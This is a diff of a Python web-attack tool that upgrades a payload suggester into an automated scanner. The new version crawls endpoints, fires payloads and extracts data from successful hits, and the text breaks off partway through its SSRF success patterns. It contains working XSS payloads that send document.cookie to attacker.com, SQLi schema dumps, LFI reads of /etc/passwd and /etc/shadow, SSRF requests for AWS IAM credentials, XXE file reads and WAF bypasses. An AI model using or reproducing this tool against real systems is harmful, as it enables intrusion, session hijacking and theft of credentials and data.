@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-Context-Aware Payload Mutator
-------------------------------
-Analyzes HTTP response context and generates intelligent,
-context-specific payloads for web application red teaming.
+Context-Aware Payload Mutator v2.0
+------------------------------------
+Crawls endpoints, fires context-specific payloads,
+confirms execution, and extracts real data from successful hits.
 """
 
 import re
@@ -12,16 +12,16 @@ import json
 import time
 import argparse
 import urllib.parse
-import base64
+import html
 from typing import Optional
 from dataclasses import dataclass, field
 
 try:
     import requests
-    from colorama import init, Fore, Style, Back
+    from colorama import init, Fore, Style
     init(autoreset=True)
 except ImportError:
-    print("Missing dependencies. Run: pip install requests colorama")
+    print("Missing deps. Run: pip install requests colorama")
     sys.exit(1)
 
 
@@ -33,7 +33,7 @@ except ImportError:
 class Context:
     name: str
     description: str
-    confidence: float  # 0.0 – 1.0
+    confidence: float
 
 @dataclass
 class Payload:
@@ -41,18 +41,161 @@ class Payload:
     context: str
     encoding: str
     bypass_type: str
-    risk: str       # low / medium / high
+    risk: str
     notes: str = ""
+    vuln_type: str = ""
 
 @dataclass
-class ScanResult:
+class FireResult:
+    """Result of actually sending a payload to an endpoint."""
+    endpoint: str
+    parameter: str
+    method: str
+    payload: Payload
+    status_code: int
+    response_time: float
+    confirmed: bool
+    evidence: str
+    extracted_data: str
+    response_snippet: str
+    full_url: str
+
+@dataclass
+class EndpointResult:
     url: str
     parameter: str
-    contexts: list[Context] = field(default_factory=list)
-    payloads: list[Payload] = field(default_factory=list)
+    method: str
+    contexts: list = field(default_factory=list)
     waf_detected: bool = False
     waf_vendor: str = ""
-    response_time: float = 0.0
+    fire_results: list = field(default_factory=list)
+
+
+# ──────────────────────────────────────────────
+#  Endpoint Crawler
+# ──────────────────────────────────────────────
+
+class EndpointCrawler:
+    COMMON_PARAMS = [
+        "q", "s", "search", "query", "input", "id", "page", "url", "path",
+        "file", "name", "user", "username", "email", "redirect", "next",
+        "return", "ref", "src", "dest", "target", "data", "content", "text",
+        "msg", "message", "comment", "lang", "format", "type", "action",
+        "cmd", "load", "include", "template", "view", "cat", "filter",
+        "callback", "jsonp", "token", "key", "api_key",
+    ]
+
+    COMMON_PATHS = [
+        "", "/search", "/api/search", "/api/v1/search",
+        "/login", "/register", "/api/login",
+        "/profile", "/user", "/account",
+        "/api/user", "/api/v1/user",
+        "/admin", "/admin/login",
+        "/api/data", "/api/v1/data",
+        "/include", "/load", "/page",
+    ]
+
+    def __init__(self, session, timeout=10, delay=0.3):
+        self.session = session
+        self.timeout = timeout
+        self.delay = delay
+
+    def discover(self, base_url: str, param: Optional[str],
+                 crawl: bool = False) -> list:
+        parsed = urllib.parse.urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        targets = []
+
+        existing_params = urllib.parse.parse_qs(parsed.query)
+        if param:
+            targets.append((base_url, param, "GET"))
+        elif existing_params:
+            for p in existing_params:
+                targets.append((base_url, p, "GET"))
+        else:
+            for p in self.COMMON_PARAMS[:10]:
+                targets.append((base_url, p, "GET"))
+
+        if not crawl:
+            return targets
+
+        print(f"{Fore.CYAN}[CRAWL] Discovering endpoints on {origin}...")
+        found_paths = self._crawl_paths(origin)
+
+        for path_url in found_paths:
+            p_parsed = urllib.parse.urlparse(path_url)
+            p_qs = urllib.parse.parse_qs(p_parsed.query)
+            if p_qs:
+                for p in p_qs:
+                    targets.append((path_url, p, "GET"))
+            else:
+                for p in self.COMMON_PARAMS[:6]:
+                    targets.append((path_url, p, "GET"))
+
+        seen = set()
+        unique = []
+        for t in targets:
+            key = f"{t[0]}|{t[1]}|{t[2]}"
+            if key not in seen:
+                seen.add(key)
+                unique.append(t)
+
+        print(f"{Fore.CYAN}[CRAWL] {len(unique)} endpoint/parameter combinations to test")
+        return unique
+
+    def _crawl_paths(self, origin: str) -> list:
+        found = []
+        for path in self.COMMON_PATHS:
+            url = origin + path
+            try:
+                r = self.session.get(url, timeout=self.timeout,
+                                     verify=False, allow_redirects=False)
+                if r.status_code in (200, 301, 302):
+                    found.append(url)
+                    print(f"  {Fore.GREEN}[{r.status_code}] {url}")
+                time.sleep(self.delay)
+            except Exception:
+                pass
+        return found
+
+    def extract_links_and_forms(self, base_url: str) -> list:
+        targets = []
+        try:
+            r = self.session.get(base_url, timeout=10, verify=False)
+            body = r.text
+            p_parsed = urllib.parse.urlparse(base_url)
+            origin = f"{p_parsed.scheme}://{p_parsed.netloc}"
+
+            # Forms
+            forms = re.findall(
+                r'<form[^>]*action=["\']?([^"\'> ]+)["\']?[^>]*>(.*?)</form>',
+                body, re.DOTALL | re.IGNORECASE)
+            for action, form_body in forms:
+                if not action.startswith("http"):
+                    action = origin + action
+                method_m = re.search(r'method=["\']?(get|post)["\']?',
+                                     form_body, re.IGNORECASE)
+                method = method_m.group(1).upper() if method_m else "GET"
+                inputs = re.findall(
+                    r'<input[^>]*name=["\']?([^"\'> ]+)["\']?',
+                    form_body, re.IGNORECASE)
+                for inp in inputs:
+                    targets.append((action, inp, method))
+
+            # Links with params
+            links = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']',
+                               body, re.IGNORECASE)
+            for link in links:
+                if not link.startswith("http"):
+                    link = origin + link
+                lp = urllib.parse.urlparse(link)
+                qs = urllib.parse.parse_qs(lp.query)
+                for param in qs:
+                    targets.append((link, param, "GET"))
+
+        except Exception as e:
+            print(f"{Fore.YELLOW}[!] Link extraction failed: {e}")
+        return targets
 
 
 # ──────────────────────────────────────────────
@@ -60,106 +203,59 @@ class ScanResult:
 # ──────────────────────────────────────────────
 
 class ContextDetector:
-    """Analyzes HTTP responses to determine injection context."""
-
     PROBE = "CXPROBE7731"
 
     PATTERNS = {
         "html_tag_attribute": [
             r'<[a-z]+[^>]*=\s*["\']?[^"\']*CXPROBE7731',
-            r'CXPROBE7731[^"\']*["\']?\s*[a-z]+=',
+            r'CXPROBE7731[^"\']*["\']?\s*[a-z]+='
         ],
-        "html_between_tags": [
-            r'>[^<]*CXPROBE7731[^<]*<',
-        ],
-        "javascript_string_single": [
-            r"'[^']*CXPROBE7731[^']*'",
-            r"var\s+\w+\s*=\s*'[^']*CXPROBE7731",
-        ],
-        "javascript_string_double": [
-            r'"[^"]*CXPROBE7731[^"]*"',
-            r'var\s+\w+\s*=\s*"[^"]*CXPROBE7731',
-        ],
-        "javascript_template_literal": [
-            r'`[^`]*CXPROBE7731[^`]*`',
-        ],
-        "javascript_unquoted": [
-            r'(?:var|let|const)\s+\w+\s*=\s*CXPROBE7731',
-            r'=\s*CXPROBE7731\s*[;,\)]',
-        ],
-        "json_value": [
-            r'"[^"]*":\s*"[^"]*CXPROBE7731[^"]*"',
-            r'"[^"]*":\s*CXPROBE7731',
-        ],
-        "html_comment": [
-            r'<!--[^>]*CXPROBE7731[^>]*-->',
-        ],
-        "css_value": [
-            r':\s*[^;]*CXPROBE7731[^;]*;',
-            r'url\([^)]*CXPROBE7731[^)]*\)',
-        ],
-        "url_parameter": [
-            r'[?&]\w+=CXPROBE7731',
-            r'CXPROBE7731&',
-        ],
+        "html_between_tags":           [r'>[^<]*CXPROBE7731[^<]*<'],
+        "javascript_string_single":    [r"'[^']*CXPROBE7731[^']*'"],
+        "javascript_string_double":    [r'"[^"]*CXPROBE7731[^"]*"'],
+        "javascript_template_literal": [r'`[^`]*CXPROBE7731[^`]*`'],
+        "javascript_unquoted":         [r'=\s*CXPROBE7731\s*[;,\)]'],
+        "json_value":                  [r'"[^"]*":\s*"[^"]*CXPROBE7731[^"]*"'],
+        "html_comment":                [r'<!--[^>]*CXPROBE7731[^>]*-->'],
+        "css_value":                   [r':\s*[^;]*CXPROBE7731[^;]*;'],
+        "url_parameter":               [r'[?&]\w+=CXPROBE7731'],
         "sql_error": [
-            r"(SQL syntax|mysql_fetch|ORA-|syntax error|SQLSTATE)",
+            r"(SQL syntax.*MySQL|mysql_fetch|ORA-\d|syntax error|SQLSTATE|Unclosed quotation)"
         ],
-        "xml_tag": [
-            r'<\w+>[^<]*CXPROBE7731[^<]*</\w+>',
-            r'CXPROBE7731</\w+>',
-        ],
+        "xml_tag": [r'<\w+>[^<]*CXPROBE7731[^<]*</\w+>'],
     }
 
-    def detect(self, response_body: str, original_body: str = "") -> list[Context]:
+    def detect(self, body: str) -> list:
         contexts = []
         for ctx_name, patterns in self.PATTERNS.items():
             for pattern in patterns:
-                match = re.search(pattern, response_body, re.IGNORECASE)
-                if match:
-                    confidence = self._score_confidence(ctx_name, response_body, match)
+                if re.search(pattern, body, re.IGNORECASE):
                     contexts.append(Context(
                         name=ctx_name,
                         description=self._describe(ctx_name),
-                        confidence=confidence
+                        confidence=0.95 if ctx_name == "sql_error" else 0.90
                     ))
-                    break  # one match per context type is enough
-
+                    break
         if not contexts:
-            contexts.append(Context(
-                name="unknown",
-                description="Reflection found but context unclear — try manual inspection",
-                confidence=0.3
-            ))
-
+            contexts.append(Context("unknown", "Reflection found but context unclear", 0.3))
         return sorted(contexts, key=lambda c: c.confidence, reverse=True)
 
-    def _score_confidence(self, ctx_name: str, body: str, match) -> float:
-        base = 0.7
-        span = match.group(0)
-        if self.PROBE in span:
-            base += 0.2
-        if ctx_name == "sql_error":
-            base = 0.95
-        return min(base, 1.0)
-
     def _describe(self, ctx_name: str) -> str:
-        descriptions = {
-            "html_tag_attribute":       "Reflected inside an HTML tag attribute value",
-            "html_between_tags":        "Reflected between HTML tags (innerHTML context)",
-            "javascript_string_single": "Inside a single-quoted JavaScript string",
-            "javascript_string_double": "Inside a double-quoted JavaScript string",
+        return {
+            "html_tag_attribute":          "Reflected inside an HTML tag attribute value",
+            "html_between_tags":           "Reflected between HTML tags (innerHTML context)",
+            "javascript_string_single":    "Inside a single-quoted JavaScript string",
+            "javascript_string_double":    "Inside a double-quoted JavaScript string",
             "javascript_template_literal": "Inside a JS template literal (backtick string)",
-            "javascript_unquoted":      "Unquoted JavaScript variable assignment",
-            "json_value":               "Inside a JSON response value",
-            "html_comment":             "Inside an HTML comment",
-            "css_value":                "Inside a CSS property value",
-            "url_parameter":            "Reflected back as a URL parameter",
-            "sql_error":                "SQL error detected — likely SQL injection point",
-            "xml_tag":                  "Inside XML/SOAP tag content",
-            "unknown":                  "Unknown reflection context",
-        }
-        return descriptions.get(ctx_name, ctx_name)
+            "javascript_unquoted":         "Unquoted JavaScript variable assignment",
+            "json_value":                  "Inside a JSON response value",
+            "html_comment":                "Inside an HTML comment",
+            "css_value":                   "Inside a CSS property value",
+            "url_parameter":               "Reflected back as a URL parameter",
+            "sql_error":                   "SQL error detected — likely SQL injection point",
+            "xml_tag":                     "Inside XML/SOAP tag content",
+            "unknown":                     "Unknown reflection context",
+        }.get(ctx_name, ctx_name)
 
 
 # ──────────────────────────────────────────────
@@ -168,31 +264,24 @@ class ContextDetector:
 
 class WAFDetector:
     SIGNATURES = {
-        "Cloudflare":   ["cloudflare", "cf-ray", "__cfduid", "attention required"],
-        "AWS WAF":      ["aws", "x-amzn-requestid", "x-amz-cf-id"],
-        "ModSecurity":  ["mod_security", "modsecurity", "not acceptable"],
-        "Akamai":       ["akamai", "ak_bmsc", "akamaierror"],
-        "Imperva":      ["incapsula", "visid_incap", "imperva"],
-        "F5 BIG-IP":    ["f5", "bigip", "ts=", "f5-trafficshield"],
-        "Barracuda":    ["barracuda", "barra_counter_session"],
-        "Sucuri":       ["sucuri", "x-sucuri-id"],
-        "Nginx WAF":    ["nginx", "400 bad request", "access denied"],
+        "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid"],
+        "AWS WAF":     ["x-amzn-requestid", "x-amz-cf-id"],
+        "ModSecurity": ["mod_security", "modsecurity", "not acceptable"],
+        "Akamai":      ["akamai", "ak_bmsc", "akamaierror"],
+        "Imperva":     ["incapsula", "visid_incap", "imperva"],
+        "F5 BIG-IP":   ["bigip", "f5-trafficshield"],
+        "Barracuda":   ["barracuda", "barra_counter_session"],
+        "Sucuri":      ["sucuri", "x-sucuri-id"],
     }
 
-    def detect(self, response: requests.Response) -> tuple[bool, str]:
-        headers_str = str(response.headers).lower()
-        body_str = response.text.lower()
-        combined = headers_str + body_str
-
+    def detect(self, response) -> tuple:
+        combined = (str(response.headers) + response.text).lower()
         for vendor, sigs in self.SIGNATURES.items():
             for sig in sigs:
                 if sig in combined:
                     return True, vendor
-
-        # Heuristic: blocked but no clear vendor
-        if response.status_code in (403, 406, 429, 501):
+        if response.status_code in (403, 406, 429):
             return True, "Unknown WAF"
-
         return False, ""
 
 
@@ -201,202 +290,381 @@ class WAFDetector:
 # ──────────────────────────────────────────────
 
 class PayloadLibrary:
-    """Context-specific payload database with WAF bypass variants."""
-
-    def get_payloads(self, context_name: str, waf_detected: bool) -> list[Payload]:
+    def get_payloads(self, context_name: str, waf_detected: bool) -> list:
         base = self._base_payloads(context_name)
         if waf_detected:
             base += self._bypass_payloads(context_name)
         return base
 
-    def _base_payloads(self, ctx: str) -> list[Payload]:
-        payloads = {
+    def _base_payloads(self, ctx: str) -> list:
+        p = {
             "html_between_tags": [
-                Payload("<script>alert(1)</script>", ctx, "none", "XSS", "high", "Classic script tag injection"),
-                Payload("<img src=x onerror=alert(1)>", ctx, "none", "XSS", "high", "Image onerror event"),
-                Payload("<svg onload=alert(1)>", ctx, "none", "XSS", "high", "SVG onload event"),
-                Payload("<details open ontoggle=alert(1)>", ctx, "none", "XSS", "medium", "HTML5 details tag"),
-                Payload("<iframe srcdoc='<script>alert(1)</script>'>", ctx, "none", "XSS", "high", "Iframe srcdoc bypass"),
+                Payload("<script>alert(document.domain)</script>", ctx, "none", "XSS", "high", "Script tag — confirms domain", "XSS"),
+                Payload("<img src=x onerror=alert(document.cookie)>", ctx, "none", "XSS", "high", "Cookie theft via onerror", "XSS"),
+                Payload("<svg onload=alert(1)>", ctx, "none", "XSS", "high", "SVG onload", "XSS"),
+                Payload("<details open ontoggle=alert(1)>", ctx, "none", "XSS", "medium", "HTML5 details tag", "XSS"),
+                Payload("<iframe srcdoc='<script>alert(1)</script>'>", ctx, "none", "XSS", "high", "Iframe srcdoc", "XSS"),
             ],
             "html_tag_attribute": [
-                Payload('" onmouseover="alert(1)', ctx, "none", "XSS", "high", "Break out of attribute, inject event"),
-                Payload("' onmouseover='alert(1)", ctx, "none", "XSS", "high", "Single-quote variant"),
-                Payload('" autofocus onfocus="alert(1)', ctx, "none", "XSS", "high", "Autofocus trick — no interaction needed"),
-                Payload('"><script>alert(1)</script>', ctx, "none", "XSS", "high", "Close tag and inject script"),
-                Payload('" style="animation-name:x" onanimationstart="alert(1)', ctx, "none", "XSS", "medium", "CSS animation event"),
+                Payload('" onmouseover="alert(document.domain)', ctx, "none", "XSS", "high", "Attribute break + event", "XSS"),
+                Payload("' onmouseover='alert(1)", ctx, "none", "XSS", "high", "Single-quote variant", "XSS"),
+                Payload('" autofocus onfocus="alert(1)', ctx, "none", "XSS", "high", "No interaction needed", "XSS"),
+                Payload('"><script>alert(1)</script>', ctx, "none", "XSS", "high", "Close tag + inject", "XSS"),
+                Payload('" style="animation-name:x" onanimationstart="alert(1)', ctx, "none", "XSS", "medium", "CSS animation event", "XSS"),
             ],
             "javascript_string_single": [
-                Payload("';alert(1)//", ctx, "none", "XSS", "high", "Break out of single-quoted JS string"),
-                Payload("'-alert(1)-'", ctx, "none", "XSS", "high", "Arithmetic context escape"),
-                Payload("';alert(String.fromCharCode(88,83,83))//", ctx, "none", "XSS", "medium", "Char code obfuscation"),
-                Payload(r"'\x3cscript\x3ealert(1)\x3c/script\x3e", ctx, "hex", "XSS", "medium", "Hex encoded script tag"),
+                Payload("';alert(document.domain)//", ctx, "none", "XSS", "high", "Break JS string", "XSS"),
+                Payload("'-alert(1)-'", ctx, "none", "XSS", "high", "Arithmetic escape", "XSS"),
+                Payload("';fetch('https://attacker.com?c='+document.cookie)//", ctx, "none", "XSS", "high", "Cookie exfil", "XSS"),
             ],
             "javascript_string_double": [
-                Payload('";alert(1)//', ctx, "none", "XSS", "high", "Break out of double-quoted JS string"),
-                Payload('"-alert(1)-"', ctx, "none", "XSS", "high", "Arithmetic context escape"),
-                Payload('";fetch("https://evil.com?c="+document.cookie)//', ctx, "none", "XSS", "high", "Cookie exfiltration"),
+                Payload('";alert(document.domain)//', ctx, "none", "XSS", "high", "Break double-quoted JS string", "XSS"),
+                Payload('"-alert(1)-"', ctx, "none", "XSS", "high", "Arithmetic escape", "XSS"),
+                Payload('";fetch("https://attacker.com?c="+document.cookie)//', ctx, "none", "XSS", "high", "Cookie exfil", "XSS"),
             ],
             "javascript_template_literal": [
-                Payload("${alert(1)}", ctx, "none", "XSS", "high", "Template literal expression injection"),
-                Payload("${fetch('https://evil.com?c='+document.cookie)}", ctx, "none", "XSS", "high", "Cookie theft via template literal"),
-                Payload("${''.constructor.constructor('alert(1)')()} ", ctx, "none", "XSS", "high", "Constructor chain bypass"),
-            ],
-            "javascript_unquoted": [
-                Payload(";alert(1)//", ctx, "none", "XSS", "high", "Semicolon injection into JS"),
-                Payload("1;alert(1)", ctx, "none", "XSS", "high", "Numeric context injection"),
-            ],
-            "json_value": [
-                Payload('","x":"<script>alert(1)</script>', ctx, "none", "XSS/Injection", "high", "JSON value escape"),
-                Payload('\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', ctx, "unicode", "XSS", "medium", "Unicode escaped script tag"),
-                Payload('</script><script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON in HTML script block break"),
-            ],
-            "html_comment": [
-                Payload("--><script>alert(1)</script><!--", ctx, "none", "XSS", "high", "Break out of HTML comment"),
-                Payload("--><img src=x onerror=alert(1)><!--", ctx, "none", "XSS", "medium", "Comment escape with img"),
-            ],
-            "css_value": [
-                Payload("expression(alert(1))", ctx, "none", "XSS", "medium", "Old IE CSS expression (legacy targets)"),
-                Payload(");}</style><script>alert(1)</script><style>", ctx, "none", "XSS", "high", "Break out of style block"),
-                Payload('url("javascript:alert(1)")', ctx, "none", "XSS", "medium", "CSS url() javascript protocol"),
+                Payload("${alert(document.domain)}", ctx, "none", "XSS", "high", "Template literal injection", "XSS"),
+                Payload("${fetch('https://attacker.com?c='+document.cookie)}", ctx, "none", "XSS", "high", "Cookie exfil via template literal", "XSS"),
             ],
             "sql_error": [
-                Payload("' OR '1'='1", ctx, "none", "SQLi", "high", "Classic auth bypass"),
-                Payload("' OR 1=1--", ctx, "none", "SQLi", "high", "Comment-based bypass"),
-                Payload("' UNION SELECT null,null,null--", ctx, "none", "SQLi", "high", "Union-based detection"),
-                Payload("' AND SLEEP(5)--", ctx, "none", "SQLi-Time", "high", "Time-based blind detection"),
-                Payload("'; DROP TABLE users--", ctx, "none", "SQLi", "high", "Destructive test (use with caution)"),
-                Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", ctx, "none", "SQLi-Time", "high", "Nested sleep bypass"),
-            ],
-            "xml_tag": [
-                Payload("]]><script>alert(1)</script><![CDATA[", ctx, "none", "XSS/XXE", "high", "CDATA break injection"),
-                Payload("<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xx SYSTEM 'file:///etc/passwd'>]><x>&xx;</x>", ctx, "none", "XXE", "high", "XXE file read"),
-                Payload("&lt;script&gt;alert(1)&lt;/script&gt;", ctx, "html_entity", "XSS", "medium", "HTML entity encoded XSS"),
+                Payload("'", ctx, "none", "SQLi", "high", "Single quote — triggers SQL error", "SQLi"),
+                Payload("' OR '1'='1", ctx, "none", "SQLi", "high", "Auth bypass", "SQLi"),
+                Payload("' OR 1=1--", ctx, "none", "SQLi", "high", "Comment bypass", "SQLi"),
+                Payload("' UNION SELECT null,null,null--", ctx, "none", "SQLi", "high", "Union column detection", "SQLi"),
+                Payload("' UNION SELECT 1,2,3--", ctx, "none", "SQLi", "high", "Union data positions", "SQLi"),
+                Payload("' UNION SELECT table_name,2,3 FROM information_schema.tables--", ctx, "none", "SQLi", "high", "Dump table names", "SQLi"),
+                Payload("' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--", ctx, "none", "SQLi", "high", "Dump columns", "SQLi"),
+                Payload("' AND SLEEP(5)--", ctx, "none", "SQLi-Time", "high", "Time-based blind", "SQLi"),
+                Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", ctx, "none", "SQLi-Time", "high", "Nested sleep bypass", "SQLi"),
             ],
             "url_parameter": [
-                Payload("javascript:alert(1)", ctx, "none", "XSS", "high", "JS protocol in URL param"),
-                Payload("%3Cscript%3Ealert(1)%3C/script%3E", ctx, "url", "XSS", "medium", "URL encoded script tag"),
-                Payload("/../../../etc/passwd", ctx, "none", "LFI", "high", "Path traversal attempt"),
-                Payload("http://evil.com", ctx, "none", "SSRF/Redirect", "medium", "Open redirect / SSRF test"),
+                Payload("javascript:alert(1)", ctx, "none", "XSS", "high", "JS protocol", "XSS"),
+                Payload("/../../../etc/passwd", ctx, "none", "LFI", "high", "Path traversal — Linux passwd", "LFI"),
+                Payload("....//....//....//etc/passwd", ctx, "none", "LFI", "high", "Double-dot bypass", "LFI"),
+                Payload("../../../../etc/passwd", ctx, "none", "LFI", "high", "Classic LFI", "LFI"),
+                Payload("../../../../etc/shadow", ctx, "none", "LFI", "high", "Shadow file — password hashes", "LFI"),
+                Payload("../../../../proc/self/environ", ctx, "none", "LFI", "high", "Process env vars", "LFI"),
+                Payload("../../../../var/log/apache2/access.log", ctx, "none", "LFI", "medium", "Apache log read", "LFI"),
+                Payload("file:///etc/passwd", ctx, "none", "SSRF/LFI", "high", "File protocol", "SSRF"),
+                Payload("http://169.254.169.254/latest/meta-data/", ctx, "none", "SSRF", "high", "AWS EC2 metadata", "SSRF"),
+                Payload("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ctx, "none", "SSRF", "high", "AWS IAM credentials", "SSRF"),
+                Payload("http://metadata.google.internal/computeMetadata/v1/", ctx, "none", "SSRF", "high", "GCP metadata", "SSRF"),
+                Payload("http://localhost:80/admin", ctx, "none", "SSRF", "high", "Internal admin access", "SSRF"),
+                Payload("http://127.0.0.1:8080/", ctx, "none", "SSRF", "medium", "Localhost alt port", "SSRF"),
+                Payload("dict://127.0.0.1:6379/info", ctx, "none", "SSRF", "high", "Redis info via SSRF", "SSRF"),
+            ],
+            "xml_tag": [
+                Payload("]]><script>alert(1)</script><![CDATA[", ctx, "none", "XSS/XXE", "high", "CDATA break", "XSS"),
+                Payload('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx SYSTEM "file:///etc/passwd">]><x>&xx;</x>', ctx, "none", "XXE", "high", "XXE file read — passwd", "XXE"),
+                Payload('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx SYSTEM "file:///etc/hosts">]><x>&xx;</x>', ctx, "none", "XXE", "high", "XXE file read — hosts", "XXE"),
+            ],
+            "json_value": [
+                Payload('","x":"<script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON value escape", "XSS"),
+                Payload('</script><script>alert(1)</script>', ctx, "none", "XSS", "high", "JSON in HTML script block", "XSS"),
+            ],
+            "html_comment": [
+                Payload("--><script>alert(1)</script><!--", ctx, "none", "XSS", "high", "Break out of comment", "XSS"),
+            ],
+            "css_value": [
+                Payload(");}</style><script>alert(1)</script><style>", ctx, "none", "XSS", "high", "Break out of style block", "XSS"),
             ],
         }
-        return payloads.get(ctx, [
-            Payload("<script>alert(1)</script>", ctx, "none", "XSS", "medium", "Generic fallback — context unclear"),
-            Payload("' OR '1'='1", ctx, "none", "SQLi", "medium", "Generic SQLi fallback"),
+        return p.get(ctx, [
+            Payload("<script>alert(1)</script>", ctx, "none", "XSS", "medium", "Generic XSS fallback", "XSS"),
+            Payload("' OR '1'='1", ctx, "none", "SQLi", "medium", "Generic SQLi fallback", "SQLi"),
+            Payload("/../../../etc/passwd", ctx, "none", "LFI", "medium", "Generic LFI fallback", "LFI"),
         ])
 
-    def _bypass_payloads(self, ctx: str) -> list[Payload]:
-        """WAF bypass variants for each context."""
-        bypasses = {
+    def _bypass_payloads(self, ctx: str) -> list:
+        bypass = {
             "html_between_tags": [
-                Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case bypass"),
-                Payload("<scr\x00ipt>alert(1)</scr\x00ipt>", ctx, "null_byte", "XSS-WAF-Bypass", "high", "Null byte insertion"),
-                Payload("<script>eval(atob('YWxlcnQoMSk='))</script>", ctx, "base64", "XSS-WAF-Bypass", "high", "Base64 encoded payload"),
-                Payload("<%00script>alert(1)</script>", ctx, "null_byte", "XSS-WAF-Bypass", "medium", "URL-encoded null byte"),
-                Payload("<scr<!---->ipt>alert(1)</scr<!---->ipt>", ctx, "comment", "XSS-WAF-Bypass", "medium", "Comment insertion in tag"),
+                Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case bypass", "XSS"),
+                Payload("<script>eval(atob('YWxlcnQoMSk='))</script>", ctx, "base64", "XSS-WAF-Bypass", "high", "Base64 encoded", "XSS"),
+                Payload("<scr<!---->ipt>alert(1)</scr<!---->ipt>", ctx, "comment", "XSS-WAF-Bypass", "medium", "Comment insertion", "XSS"),
             ],
             "html_tag_attribute": [
-                Payload('" OnMoUsEoVeR="alert(1)', ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case event handler"),
-                Payload('" on\x09mouseover="alert(1)', ctx, "tab", "XSS-WAF-Bypass", "high", "Tab character in event name"),
-                Payload('" onmouseover\x00="alert(1)', ctx, "null_byte", "XSS-WAF-Bypass", "medium", "Null byte before equals"),
+                Payload('" OnMoUsEoVeR="alert(1)', ctx, "case", "XSS-WAF-Bypass", "high", "Mixed case event", "XSS"),
+                Payload('" on\x09mouseover="alert(1)', ctx, "tab", "XSS-WAF-Bypass", "high", "Tab in event name", "XSS"),
             ],
             "sql_error": [
-                Payload("' /*!OR*/ '1'='1", ctx, "comment", "SQLi-WAF-Bypass", "high", "MySQL inline comment bypass"),
-                Payload("'/**/OR/**/1=1--", ctx, "comment", "SQLi-WAF-Bypass", "high", "Comment-space substitution"),
-                Payload("' %4fR '1'='1", ctx, "url", "SQLi-WAF-Bypass", "high", "URL encoded OR keyword"),
-                Payload("' OR 0x313d31--", ctx, "hex", "SQLi-WAF-Bypass", "high", "Hex value comparison"),
-                Payload("';WAITFOR DELAY '0:0:5'--", ctx, "none", "SQLi-WAF-Bypass", "high", "MSSQL time-based bypass"),
+                Payload("' /*!OR*/ '1'='1", ctx, "comment", "SQLi-WAF-Bypass", "high", "MySQL inline comment", "SQLi"),
+                Payload("'/**/OR/**/1=1--", ctx, "comment", "SQLi-WAF-Bypass", "high", "Comment space sub", "SQLi"),
+                Payload("' %4fR '1'='1", ctx, "url", "SQLi-WAF-Bypass", "high", "URL encoded OR", "SQLi"),
             ],
-            "javascript_string_single": [
-                Payload("\\';alert(1)//", ctx, "escape", "XSS-WAF-Bypass", "high", "Backslash escape bypass"),
-                Payload("'-eval(String.fromCharCode(97,108,101,114,116,40,49,41))-'", ctx, "charcode", "XSS-WAF-Bypass", "high", "fromCharCode obfuscation"),
+            "url_parameter": [
+                Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", ctx, "url", "LFI-WAF-Bypass", "high", "URL encoded traversal", "LFI"),
+                Payload("..%252f..%252f..%252fetc%252fpasswd", ctx, "double_url", "LFI-WAF-Bypass", "high", "Double URL encoded LFI", "LFI"),
+                Payload("http://[::1]/admin", ctx, "none", "SSRF-WAF-Bypass", "high", "IPv6 localhost bypass", "SSRF"),
             ],
         }
-        return bypasses.get(ctx, [
-            Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "WAF-Bypass", "medium", "Generic case bypass"),
-            Payload("%3Cscript%3Ealert(1)%3C%2Fscript%3E", ctx, "url", "WAF-Bypass", "medium", "Generic URL encode bypass"),
+        return bypass.get(ctx, [
+            Payload("<ScRiPt>alert(1)</sCrIpT>", ctx, "case", "WAF-Bypass", "medium", "Generic case bypass", "XSS"),
         ])
 
 
 # ──────────────────────────────────────────────
-#  Core Scanner
+#  Payload Firing Engine
+# ──────────────────────────────────────────────
+
+class PayloadFirer:
+    SUCCESS_PATTERNS = {
+        "LFI": [
+            (r"root:.*:0:0:", "CONFIRMED: /etc/passwd — root entry exposed"),
+            (r"daemon:.*:/usr/sbin", "CONFIRMED: /etc/passwd — daemon entry exposed"),
+            (r"www-data:.*:/var/www", "CONFIRMED: /etc/passwd — www-data entry"),
+            (r"bin:.*:/bin", "CONFIRMED: /etc/passwd content readable"),
+            (r"SSH_CLIENT|PATH=|HOME=|USER=|SHELL=", "CONFIRMED: /proc/self/environ — env vars exposed"),
+            (r"127\.0\.0\.1\s+localhost", "CONFIRMED: /etc/hosts content readable"),
+            (r"\$apr1\$|\$6\$|\$1\$", "CONFIRMED: /etc/shadow — password hashes exposed"),
+            (r"GET /.*HTTP/1\.|POST /.*HTTP/1\.", "CONFIRMED: Server log file readable"),
+        ],
+        "SQLi": [
+            (r"SQL syntax.*MySQL|MySQL.*SQL syntax", "CONFIRMED: MySQL SQL syntax error"),
+            (r"Warning.*mysql_", "CONFIRMED: MySQL error — mysql_ function exposed"),
+            (r"ORA-\d{5}", "CONFIRMED: Oracle database error"),
+            (r"Microsoft SQL Server.*\[SQL", "CONFIRMED: MSSQL error exposed"),
+            (r"SQLSTATE\[", "CONFIRMED: PDO SQL error"),
+            (r"Unclosed quotation mark", "CONFIRMED: MSSQL unclosed quote error"),
+            (r"pg_query\(\)|PostgreSQL.*ERROR", "CONFIRMED: PostgreSQL error"),
+            (r"SQLite.*exception|sqlite3\.OperationalError", "CONFIRMED: SQLite error"),
+            (r"information_schema|TABLE_NAME", "CONFIRMED: Schema data in response"),
+        ],
+        "SSRF": [
